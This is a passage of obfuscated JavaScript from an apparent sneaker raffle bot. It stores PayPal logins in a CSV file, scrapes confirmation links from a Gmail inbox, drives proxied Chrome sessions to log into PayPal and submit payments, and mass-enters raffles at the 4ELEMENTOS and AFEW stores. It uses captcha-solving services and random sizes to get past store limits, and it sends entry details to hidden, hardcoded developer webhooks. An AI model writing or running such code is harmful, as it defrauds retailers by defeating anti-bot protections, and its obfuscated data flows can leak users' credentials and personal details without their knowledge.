        let _0x4fbafb = await _0x1e7814['get']('Password');
        return _0xa6d6d0['Password'] = _0x4fbafb['Password'], _0x3d3f42['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0xa6d6d0['Email'] + ',' + _0xa6d6d0['Password'] + ',' + _0xa6d6d0['Proxy']), _0xa6d6d0;
    }
    let _0x2e073c = await _0x15b1da();
    var _0x534657 = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x28b664 = await _0x1e7814['get']('Amount'), _0x3e8001 = _0x28b664['Amount'];
    async function _0x2ca377() {
        let _0x186525 = 0x0;
        var _0x59f748 = new _0x266969({
            'user': _0x114346['masterMail'],
            'password': _0x114346['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x12bd26(_0x183be2) {
            _0x59f748['openBox']('INBOX', ![], _0x183be2);
        }
        _0x59f748['once']('ready', function () {
            _0x12bd26(function (_0x4a1f92, _0x489423) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x4a1f92)
                    throw _0x4a1f92;
                _0x59f748['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x1021ee, _0x191f06) {
                    if (!_0x191f06 || !_0x191f06['length'])
                        console['log'](_0xed09ee() + '\x20[' + _0x480496 + ']\x20No\x20mails\x20found'), _0x59f748['end']();
                    else {
                        _0x191f06 = _0x191f06['slice'](0x0, _0x3e8001);
                        var _0x2bd6de = _0x59f748['seq']['fetch'](_0x191f06, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x2bd6de['on']('message', function (_0x36725d, _0x3ba4b0) {
                            var _0x946235 = '(#' + _0x3ba4b0 + ')\x20';
                            _0x36725d['on']('body', function (_0x386302, _0x3baa93) {
                                _0x172805(_0x386302, (_0x1597b8, _0x2b4147) => {
                                    if (_0x2b4147['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x2b4147['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x2b4147['text']['split']('[')[0x2];
                                        var _0x3aad15 = mes['split'](']')[0x0];
                                        _0x534657['push'](_0x3aad15);
                                    }
                                });
                            }), _0x36725d['once']('end', function () {
                                _0x186525++;
                            });
                        }), _0x2bd6de['once']('error', function (_0x44ba7c) {
                            console['log']('Fetch\x20error:\x20' + _0x44ba7c);
                        }), _0x2bd6de['once']('end', function () {
                            _0x59f748['end']();
                        });
                    }
                });
            });
        }), _0x59f748['once']('error', function (_0x384124) {
            console['log'](_0x2d77f8['red'](_0x384124['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x59f748['once']('end', async function () {
        }), _0x59f748['connect']();
    }
    try {
        _0x2ca377(), await _0x572e60(0xfa0), console['log']('Found\x20' + _0x534657['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x572e60(0xfa0);
    }
    var _0x3bd267;
    _0x59687e('' + _0x480496);
    var _0x87ca78 = _0x2e073c['Proxy']['split'](':'), _0x6176a7;
    try {
        _0x6176a7 = await _0x5dd90e['launch']({
            'userDataDir': 'sessions/' + _0x2e073c['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x87ca78[0x0] + ':' + _0x87ca78[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x6176a7 = await _0x5dd90e['launch']({
            'userDataDir': 'sessions/' + _0x2e073c['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x87ca78[0x0] + ':' + _0x87ca78[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0xed09ee() + '\x20[' + _0x480496 + ']\x20Getting\x20Session');
        const _0x4096a5 = await _0x6176a7['newPage']();
        await _0x4096a5['authenticate']({
            'username': '' + _0x87ca78[0x2],
            'password': '' + _0x87ca78[0x3]
        }), await _0x4096a5['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x4096a5['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0xed09ee() + '\x20[' + _0x480496 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x4096a5['waitForSelector']('#email');
            let _0x189f8a = await _0x4096a5['$eval']('#email', _0x3fc25a => _0x3fc25a['getAttribute']('value'));
            if (_0x189f8a == '') {
                await _0x4096a5['type']('#email', _0x2e073c['Email']), await _0x572e60(0x1d3);
                let _0xd3e954 = await _0x4096a5['$']('#splitPassword');
                _0xd3e954 && (await _0x4096a5['click']('#btnNext'), await _0x572e60(0xa28)), await _0x4096a5['type']('#password', _0x2e073c['Password']), await _0x572e60(0x35c), await _0x4096a5['click']('#btnLogin');
            } else
                await _0x4096a5['type']('#password', _0x2e073c['Password']), await _0x572e60(0x35c), await _0x4096a5['click']('#btnLogin');
            await _0x4096a5['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0xed09ee() + '\x20[' + _0x480496 + ']\x20Successfully\x20logged\x20in'), await _0x572e60(0x2710);
        } catch (_0x5cf52e) {
            throw new Error('Login\x20session\x20expired\x20' + _0x5cf52e);
        }
        for (var _0x1f6613 = 0x0; _0x1f6613 < _0x534657['length']; _0x1f6613++) {
            console['log'](_0xed09ee() + '\x20[' + _0x480496 + ']\x20Task\x20' + (_0x1f6613 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x59687e(_0x480496 + '\x20Task\x20' + (_0x1f6613 + 0x1) + '\x20/\x20' + _0x534657['length']);
            const _0x35cfe0 = await _0x6176a7['newPage']();
            await _0x35cfe0['goto']('' + _0x534657[_0x1f6613], { 'waitUntil': 'networkidle2' }), await _0x572e60(0xbb8);
            try {
                const _0x2e614e = await _0x35cfe0['$']('#challenge-heading');
                _0x2e614e && (console['log'](_0xed09ee() + '\x20[' + _0x480496 + ']\x20Task\x20' + (_0x1f6613 + 0x1) + '\x20:\x20' + _0x2d77f8['yellow']('2FA\x20Required')), await _0x35cfe0['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x572e60(0x9c40), await _0x35cfe0['waitForSelector']('#payment-submit-btn'), await _0x35cfe0['$eval']('#payment-submit-btn', _0x305a0b => _0x305a0b['click']()), await _0x35cfe0['click']('#payment-submit-btn');
                try {
                    await _0x35cfe0['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x572e60(0x5dc), console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0x480496 + ']\x20Task\x20' + (_0x1f6613 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x369731) {
                    _0xd2e534 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x369731['message']);
                } finally {
                    if (_0xd2e534 == 'yes' && _0x3a4988 != 0x2) {
                        console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x480496['name'] + ']\x20Task\x20' + (_0x1f6613 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3a4988 + '\x20/\x205)')), _0x1f6613 = _0x1f6613 - 0x1, _0x3a4988 = _0x3a4988 + 0x1;
                        continue;
                    }
                    _0xd2e534 == 'yes' && _0x3a4988 >= 0x2 && (_0x58f6f1(csv[_0x1f6613], _0x480496), _0xd2e534 = 'no', _0x3a4988 = 0x0), await _0x35cfe0['close'](), await _0x572e60(0x4650);
                }
            } catch (_0x52975a) {
                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x480496 + ']\x20Task\x20' + (_0x1f6613 + 0x1) + '\x20:\x20' + _0x52975a));
            }
        }
    } catch (_0x2bfacb) {
        console['log'](_0x2d77f8['red']('' + _0x2bfacb));
    } finally {
        await _0x6176a7['close']();
    }
}
const _0x509612 = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x57b9b1, _0x430c7c, _0x261ef9) {
                    _0x5dd90e['use'](_0x118712()), _0x5dd90e['use'](_0x1e1820({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x114346['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5c2348 = 0x0; _0x5c2348 < _0x430c7c['length']; _0x5c2348++) {
                        if (_0x4f69de != 'yes')
                            var _0x4f69de = '', _0x3526da = 0x0;
                        var _0x4ee73b;
                        try {
                            await _0x44ca58(_0x430c7c, _0x5c2348);
                        } catch {
                            _0x4f69de = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x59687e(_0x57b9b1['name'] + '\x20Task\x20' + (_0x5c2348 + 0x1) + '\x20/\x20' + _0x430c7c['length'] + '\x20||\x20File:\x20' + _0x2b0c3a + '\x20Proxies:\x20' + _0x5e9a1f);
                        var _0x2577b1 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x1f97c8 = Math['round'](Math['random']() * (_0x2577b1['length'] - 0x1));
                        _0x430c7c[_0x5c2348]['Size'] == 'RANDOM' && (_0x430c7c[_0x5c2348]['Size'] = _0x2577b1[_0x1f97c8]);
                        var _0x3d0154 = Math['round'](Math['random']() * (_0x261ef9['length'] - 0x1)), _0x19734c = _0x261ef9[_0x3d0154]['split'](':'), _0x2ce573;
                        try {
                            _0x2ce573 = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x19734c[0x0] + ':' + _0x19734c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2ce573 = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x19734c[0x0] + ':' + _0x19734c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0xed09ee() + '\x20[' + _0x57b9b1['name'] + ']\x20Task\x20' + (_0x5c2348 + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x261c7f = await _0x2ce573['newPage']();
                            await _0x261c7f['authenticate']({
                                'username': '' + _0x19734c[0x2],
                                'password': '' + _0x19734c[0x3]
                            }), await _0x261c7f['setRequestInterception'](!![]), _0x261c7f['on']('request', _0x52d817 => {
                                _0x52d817['resourceType']() === 'image' || _0x52d817['resourceType']() === 'font' || _0x52d817['resourceType']() === 'media' ? _0x52d817['abort']() : _0x52d817['continue']();
                            }), await _0x261c7f['goto'](_0x430c7c[_0x5c2348]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0xed09ee() + '\x20[' + _0x57b9b1['name'] + ']\x20Task\x20' + (_0x5c2348 + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x261c7f['waitForSelector']('#accept-all-gdpr'), await _0x261c7f['click']('#accept-all-gdpr'), await _0x261c7f['waitForSelector']('#raffles-product'), await _0x572e60(0x3e8), await _0x261c7f['$eval']('#raffles-product', _0x153955 => _0x153955['click']()), await _0x572e60(0x1388), await _0x261c7f['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x4069e9 = await _0x261c7f['$']('.fancybox-inner\x20>\x20iframe'), _0x3d8056 = await _0x4069e9['contentFrame']();
                            console['log'](_0xed09ee() + '\x20[' + _0x57b9b1['name'] + ']\x20Task\x20' + (_0x5c2348 + 0x1) + '\x20:\x20Checking\x20Information'), await _0x3d8056['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x572e60(0x1f4), await _0x3d8056['type']('input[name=\x22sm-form-email\x22]', _0x430c7c[_0x5c2348]['Email']), await _0x572e60(0xc8), await _0x3d8056['type']('input[name=\x22sm-form-name\x22]', _0x430c7c[_0x5c2348]['FirstName'] + '\x20' + _0x430c7c[_0x5c2348]['LastName']), await _0x572e60(0xc8), await _0x3d8056['type']('input[name=\x22sm-form-street\x22]', _0x430c7c[_0x5c2348]['Address1'] + '\x20' + _0x430c7c[_0x5c2348]['HouseNumber'] + '\x20' + _0x430c7c[_0x5c2348]['Address2']), await _0x572e60(0xc8), await _0x3d8056['type']('input[name=\x22sm-form-city\x22]', _0x430c7c[_0x5c2348]['City']), await _0x572e60(0xc8), await _0x3d8056['type']('input[name=\x22sm-form-province\x22]', _0x430c7c[_0x5c2348]['State']), await _0x572e60(0xc8), await _0x3d8056['type']('input[name=\x22sm-form-zip\x22]', _0x430c7c[_0x5c2348]['Zip']), await _0x572e60(0xc8), await _0x3d8056['type']('input[name=\x22sm-form-country\x22]', _0x430c7c[_0x5c2348]['Country']), await _0x572e60(0xc8), await _0x3d8056['type']('input[name=\x22sm-form-phone\x22]', _0x430c7c[_0x5c2348]['Phone']), await _0x572e60(0xc8), await _0x3d8056['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x430c7c[_0x5c2348]['Follower']), await _0x572e60(0xc8), await _0x3d8056['type']('input[name=\x22sm-cst.size\x22]', _0x430c7c[_0x5c2348]['Size']), await _0x572e60(0x1f4), await _0x3d8056['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x572e60(0x1f4), await _0x3d8056['click']('.icheckbox_simple-custom'), await _0x572e60(0x1f4), console['log'](_0xed09ee() + '\x20[' + _0x57b9b1['name'] + ']\x20Task\x20' + (_0x5c2348 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x3d8056['$eval']('form', _0x5c1927 => _0x5c1927['submit']()), console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0x57b9b1['name'] + ']\x20Task\x20' + (_0x5c2348 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x4f69de = '';
                            var _0x42be29 = await _0x254487(_0x430c7c[_0x5c2348], _0x57b9b1, 'dev', ![]), _0xb12532 = await _0x254487(_0x430c7c[_0x5c2348], _0x57b9b1, 'pub', ![]);
                            const _0x2d85a8 = {
                                'succesDEVMSG': { 'embeds': [_0x42be29] },
                                'succesPUBMSG': { 'embeds': [_0xb12532] }
                            };
                            try {
                                _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x2d85a8['succesDEVMSG']), await _0x572e60(0xc8), await _0x5641c6(_0x1543f5, _0x2d85a8['succesDEVMSG']), await _0x572e60(0xc8), await _0x5641c6(_0x30beeb, _0x2d85a8['succesPUBMSG']);
                            } catch (_0x53235a) {
                                console['log'](_0x2d77f8['yellow'](_0xed09ee() + '\x20[' + _0x57b9b1['name'] + ']\x20Task\x20' + (_0x5c2348 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x53235a));
                            }
                        } catch (_0x33702f) {
                            console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x57b9b1['name'] + ']\x20Task\x20' + (_0x5c2348 + 0x1) + '\x20:\x20' + _0x33702f)), _0x4ee73b = '' + _0x33702f;
                            var _0x59f3c0 = await _0x254487(_0x430c7c[_0x5c2348], _0x57b9b1, 'dev', !![], _0x4ee73b), _0x42be29 = await _0x254487(_0x430c7c[_0x5c2348], _0x57b9b1, 'dev', ![]), _0xb12532 = await _0x254487(_0x430c7c[_0x5c2348], _0x57b9b1, 'pub', ![]);
                            const _0x59c7ad = {
                                'succesDEVMSG': { 'embeds': [_0x42be29] },
                                'succesPUBMSG': { 'embeds': [_0xb12532] }
                            };
                            _0x59c7ad['errorDEV'] = { 'embeds': [_0x59f3c0] }, _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x59c7ad['errorDEV']), await _0x5641c6(_0x188004, _0x59c7ad['errorDEV']), _0x33702f != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x4f69de = 'yes');
                        } finally {
                            _0x2ce573['close']();
                            if (_0x4f69de == 'yes' && _0x3526da != 0x5 && _0x4ee73b != 'Size\x20Not\x20Found') {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x57b9b1['name'] + ']\x20Task\x20' + (_0x5c2348 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3526da + '\x20/\x205)\x20')), _0x5c2348 = _0x5c2348 - 0x1, _0x3526da = _0x3526da + 0x1;
                                continue;
                            }
                            _0x4f69de == 'yes' && _0x3526da >= 0x5 && (_0x58f6f1(_0x430c7c[_0x5c2348], _0x57b9b1), _0x4f69de = 'no', _0x3526da = 0x0), console['log'](_0xed09ee() + '\x20[' + _0x57b9b1['name'] + ']\x20Waiting\x20for\x20' + _0x114346['delay'] + '\x20ms'), await _0x572e60(_0x114346['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x19f08e, _0x4d2cf2) {
                    var _0x47defe = [];
                    async function _0x80903b() {
                        var _0x4c22f5 = new _0x266969({
                            'user': _0x114346['masterMail'],
                            'password': _0x114346['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x40735c(_0x1eb20f) {
                            _0x4c22f5['openBox']('INBOX', ![], _0x1eb20f);
                        }
                        _0x4c22f5['once']('ready', function () {
                            _0x40735c(function (_0x4419f8, _0x53bb4f) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x4419f8)
                                    throw _0x4419f8;
                                _0x4c22f5['seq']['search'](['UNSEEN'], function (_0x3d4aed, _0x12e90f) {
                                    if (!_0x12e90f || !_0x12e90f['length'])
                                        console['log'](_0xed09ee() + '\x20[' + _0x19f08e['name'] + ']\x20No\x20mails\x20found'), _0x4c22f5['end']();
                                    else {
                                        var _0x2b4701 = _0x4c22f5['seq']['fetch'](_0x12e90f, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x2b4701['on']('message', function (_0x533be3, _0x158424) {
                                            var _0x36223a = '(#' + _0x158424 + ')\x20';
                                            _0x533be3['on']('body', function (_0x15f7fc, _0xed250a) {
                                                _0x172805(_0x15f7fc, (_0x3435a0, _0x37ea10) => {
                                                    if (_0x37ea10['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x1479d5 = _0x37ea10['html']['split']('\x0a');
                                                        for (var _0x5a7173 = 0x0; _0x5a7173 < _0x1479d5['length']; _0x5a7173++) {
                                                            if (_0x1479d5[_0x5a7173]['includes']('salesmanago') && _0x1479d5[_0x5a7173]['includes']('<td') && _0x1479d5[_0x5a7173]['includes']('href')) {
                                                                var _0x38db7d = _0x1479d5[_0x5a7173]['split']('href=\x22'), _0x1eaa38 = _0x38db7d[0x1]['split']('\x22')[0x0];
                                                                _0x47defe['push'](_0x1eaa38);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x533be3['once']('end', function () {
                                            });
                                        }), _0x2b4701['once']('error', function (_0x498d9f) {
                                            console['log']('Fetch\x20error:\x20' + _0x498d9f);
                                        }), _0x2b4701['once']('end', function () {
                                            _0x4c22f5['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x4c22f5['once']('error', function (_0x2d4b68) {
                            console['log'](_0x2d77f8['red'](_0x2d4b68['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x4c22f5['once']('end', async function () {
                        }), _0x4c22f5['connect']();
                    }
                    async function _0x59110a(_0x4cd35b, _0x519313, _0x53b20d) {
                        for (var _0x26c853 = 0x0; _0x26c853 < _0x519313['length']; _0x26c853++) {
                            async function _0x2dd9df(_0x495ff4, _0x4d7bf0, _0x712c39, _0x5b2bea, _0x26de8d) {
                                var _0x10e738, _0x26b580 = {}, _0x333a47 = [], _0x452072 = {}, _0x5346b8 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x33e449 = Math['round'](Math['random']() * (_0x5346b8['length'] - 0x1));
                                _0x5b2bea[_0x495ff4]['Size'] == 'RANDOM' && (_0x5b2bea[_0x495ff4]['Size'] = _0x5346b8[_0x33e449]);
                                !_0x5b2bea && (_0x5b2bea = {});
                                if (_0x114346['useRandomProxy'] = ![])
                                    var _0x10f900 = _0x26de8d[_0x495ff4]['split'](':');
                                else
                                    var _0x5a77d3 = Math['round'](Math['random']() * (_0x26de8d['length'] - 0x1)), _0x10f900 = _0x26de8d[_0x5a77d3]['split'](':');
                                var _0x5e56ea = {
                                    'jar': _0x388d4b,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x712c39['url'],
                                    'headers': _0x712c39['headers'],
                                    'body': JSON['stringify'](_0x26b580),
                                    'proxy': 'http://' + _0x10f900[0x2] + ':' + _0x10f900[0x3] + '@' + _0x10f900[0x0] + ':' + _0x10f900[0x1]
                                };
                                return _0x4d7bf0 != 'ver' && (_0x5e56ea['url'] = _0x712c39['url'], _0x5e56ea['headers'] = _0x712c39['headers']), _0x4d7bf0 == 'ver' && (_0x5e56ea['method'] = 'GET', _0x5e56ea['url'] = _0x5b2bea[_0x495ff4]), new Promise(function (_0x36e246, _0x4ffa04) {
                                    callback = async (_0x3d5ea1, _0x2a4519, _0x6c6015) => {
                                        if (!_0x3d5ea1 && _0x2a4519['statusCode'] == 0xca || !_0x3d5ea1 && _0x2a4519['statusCode'] == 0xc8) {
                                            if (_0x4d7bf0 != 'ver') {
                                                var _0xc8c71c = await _0x254487(_0x5b2bea[_0x495ff4], _0x712c39, 'dev', ![]), _0x15a673 = await _0x254487(_0x5b2bea[_0x495ff4], _0x712c39, 'pub', ![]);
                                                const _0x22d383 = {
                                                    'succesDEVMSG': { 'embeds': [_0xc8c71c] },
                                                    'succesPUBMSG': { 'embeds': [_0x15a673] }
                                                };
                                                if (_0x114346['webhook'] != undefined && _0x114346['webhook'] != '')
                                                    try {
                                                        await _0x5641c6(_0x114346['webhook'], _0x22d383['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x572e60(0xc8), await _0x5641c6(_0x1543f5, _0x22d383['succesDEVMSG']), await _0x572e60(0xc8);
                                                try {
                                                    await _0x5641c6(_0x30beeb, _0x22d383['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x14aa55(_0x5b2bea[_0x495ff4], _0x712c39);
                                            }
                                            _0x36e246(console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0x712c39['name'] + ']\x20Task\x20' + (_0x495ff4 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x4d7bf0 != 'ver') {
                                                var _0x5d2c78 = '' + _0x3d5ea1, _0x41c11a = await _0x254487(_0x5b2bea[_0x495ff4], _0x712c39, 'dev', !![], _0x5d2c78), _0x44c183 = {};
                                                _0x44c183['errorDEV'] = { 'embeds': [_0x41c11a] }, _0x58f6f1(_0x5b2bea[_0x495ff4], _0x712c39), _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x44c183['errorDEV']), await _0x5641c6(_0x188004, _0x44c183['errorDEV']);
                                            }
                                            _0x4ffa04(console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x712c39['name'] + ']\x20Task\x20' + (_0x495ff4 + 0x1) + ':\x20' + _0x3d5ea1)));
                                        }
                                    };
                                    try {
                                        _0x4d7bf0 != 'ver' ? console['log'](_0xed09ee() + '\x20[' + _0x712c39['name'] + ']\x20Task\x20' + (_0x495ff4 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x26b580['data']['attributes']['email']) : console['log'](_0xed09ee() + '\x20[' + _0x712c39['name'] + ']\x20Task\x20' + (_0x495ff4 + 0x1) + ':\x20Fetching\x20Response'), _0x2dca78(_0x5e56ea, callback);
                                    } catch (_0x2ed61e) {
                                        console['log'](_0xed09ee() + '\x20Task\x20' + (_0x495ff4 + 0x1) + ':\x20' + _0x2ed61e);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x2dd9df(_0x26c853, 'ver', _0x4cd35b, _0x519313, _0x53b20d), console['log'](_0xed09ee() + '\x20[' + _0x4cd35b['name'] + ']\x20Sleeping\x20for\x20' + _0x114346['delay'] + '\x20ms'), await _0x572e60(_0x114346['delay']);
                            } catch (_0x5aa770) {
                            }
                        }
                    }
                    try {
                        _0x80903b(), await _0x572e60(0xfa0), console['log']('Found\x20' + _0x47defe['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x59110a(_0x19f08e, _0x47defe, _0x4d2cf2);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x5a34f8, _0x168d08, _0x30249e) {
                for (var _0x535be8 = 0x0; _0x535be8 < _0x168d08['length']; _0x535be8++) {
                    _0x114346['AfewDelay'] = _0x114346['delay'];
                    var _0x49e910;
                    if (_0x4dfb27 != 'yes')
                        var _0x4dfb27 = '', _0xe741a5 = 0x0;
                    var _0x4df575 = _0x168d08[_0x535be8]['Url'], _0x3221af = _0x168d08[_0x535be8];
                    _0x59687e(_0x5a34f8['name'] + '\x20Task\x20' + (_0x535be8 + 0x1) + '\x20/\x20' + _0x168d08['length'] + '\x20||\x20File:\x20' + _0x2b0c3a + '\x20Proxies:\x20' + _0x5e9a1f);
                    try {
                        await _0x44ca58(_0x168d08, _0x535be8);
                    } catch {
                        _0x4dfb27 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x4caf05(_0x45994c) {
                        const _0x31ccdd = _0x3d3f42['readFileSync']('../successful-tasks.csv', 'utf8'), _0x1ea2e8 = _0x365ef0['parse'](_0x31ccdd, { 'header': !![] })['data'];
                        let _0x2e15af = ![];
                        for (var _0x11a380 of _0x1ea2e8) {
                            if (_0x11a380['Url'] == _0x45994c['Url'] && _0x11a380['Email'] == _0x45994c['Email']) {
                                _0x2e15af = !![];
                                break;
                            }
                        }
                        return _0x2e15af;
                    }
                    if (await _0x4caf05(_0x168d08[_0x535be8]) == !![]) {
                        console['log'](_0xed09ee() + '\x20[' + _0x5a34f8['name'] + ']\x20Task\x20' + (_0x535be8 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0xda738d = await _0x254487(_0x168d08[_0x535be8], _0x5a34f8, 'dev', ![]), _0x5b0e36 = await _0x254487(_0x168d08[_0x535be8], _0x5a34f8, 'pub', ![]);
                    const _0x21ca58 = {
                        'succesDEVMSG': { 'embeds': [_0xda738d] },
                        'succesPUBMSG': { 'embeds': [_0x5b0e36] }
                    };
                    if (_0x168d08[_0x535be8]['Email'] == '' || _0x168d08[_0x535be8]['FirstName'] == '' || _0x168d08[_0x535be8]['LastName'] == '' || _0x168d08[_0x535be8]['Country'] == '' || _0x168d08[_0x535be8]['Size'] == '' || _0x168d08[_0x535be8]['Address1'] == '' || _0x168d08[_0x535be8]['Zip'] == '') {
                        console['log'](_0xed09ee() + '\x20[' + _0x5a34f8['name'] + ']\x20Task\x20' + (_0x535be8 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x114346['useRandomProxy'] = ![])
                        var _0x45c95f = _0x30249e[_0x535be8]['split'](':');
                    else
                        var _0x55fa26 = Math['round'](Math['random']() * (_0x30249e['length'] - 0x1)), _0x45c95f = _0x30249e[_0x55fa26]['split'](':');
                    var _0x584dde;
                    try {
                        _0x584dde = await _0x5dd90e['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x45c95f[0x0] + ':' + _0x45c95f[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x584dde = await _0x5dd90e['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x45c95f[0x0] + ':' + _0x45c95f[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
